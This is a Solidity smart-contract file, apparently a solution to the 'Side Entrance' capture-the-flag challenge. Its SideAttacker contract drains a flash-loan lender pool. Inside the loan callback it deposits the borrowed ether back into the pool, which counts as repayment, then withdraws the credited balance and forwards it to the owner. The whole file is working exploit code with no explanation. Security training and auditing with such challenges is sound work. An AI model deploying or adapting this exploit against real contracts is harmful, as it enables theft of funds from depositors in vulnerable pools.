// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

contract SideAttacker {
    ISideEntranceLenderPool public immutable pool;
    address payable owner;

    constructor(address poolAddress) {
        pool = ISideEntranceLenderPool(poolAddress);
        owner = payable(msg.sender);
    }

    function attack(uint256 amount) external {
        pool.flashLoan(amount);
        pool.withdraw();
        (bool sent, ) = owner.call{value: address(this).balance}("");
        require(sent, "Failed");
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    // function getMoney() external {
    //     pool.withdraw();
    //     (bool sent, ) = owner.call{value: address(this).balance}("");
    // }

    receive() external payable {}
}
